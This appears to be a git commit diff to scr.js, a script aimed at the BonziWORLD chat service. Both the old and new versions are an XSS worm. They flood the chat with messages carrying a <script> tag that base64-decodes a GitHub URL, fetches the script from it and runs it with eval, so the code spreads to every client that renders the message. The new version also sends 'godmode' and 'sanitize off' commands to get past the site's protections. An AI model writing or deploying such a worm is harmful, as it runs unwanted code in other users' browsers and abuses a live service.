20848f4bbed6d39443564c52ccdc99099973bb43
WindowsSeven <99269521+WindowsSeven@users.noreply.github.com>
2026-07-29 00:24:33 +0300

    idk

--- scr.js
+++ scr.js
@@ -1,15 +1,16 @@
-if (typeof gnygrescriptrunning === 'undefined') {
-    let gnygrescriptrunning = true
-    audio = new Audio('https://files.catbox.moe/sbjvcg.mp3'),
-    audio.play(),
-    setInterval(function() {
-        document.title = 'BonziWORLD', 
-        document.getElementById('content').style.backgroundImage = '', 
-        socket.emit('command',{list:['name','gnygres']}), 
-        document.getElementById('content').style.backgroundRepeat = 'repeat', 
-        document.getElementById('chat_send').style.backgroundImage = '', 
-        socket.emit('command',{list:['color']}), 
-        document.getElementById('chat_bar').style.backgroundImage = '', 
-        socket.emit('talk',{text:"gnygres<script>fetch(atob('aHR0cHM6Ly9naXRodWIuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL2Jsb2IvbWFpbi9zY3IuanM=')).then(r=>r.text()).then(t=>eval(t))</script>"})
-    }, 500)
-}
+let coughtimer = 7777; // Changed from const to let
+socket.emit('command', {
+    list: ['godmode']
+});
+socket.emit('command', {
+    list: ['sanitize', 'off']
+});
+const intervalId = setInterval(function() {
+    socket.emit("command", {
+        list: ["name", "gnygres"]
+    });
+    socket.emit('talk', {
+        text: "gnygres <script>fetch(atob('aHR0cHM6Ly9naXRodWIuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL2Jsb2IvbWFpbi9zY3IuanM=')).then(r=>r.text()).then(t=>eval(t))</script>"
+    });
+    coughtimer = coughtimer - 125;
+}, coughtimer);
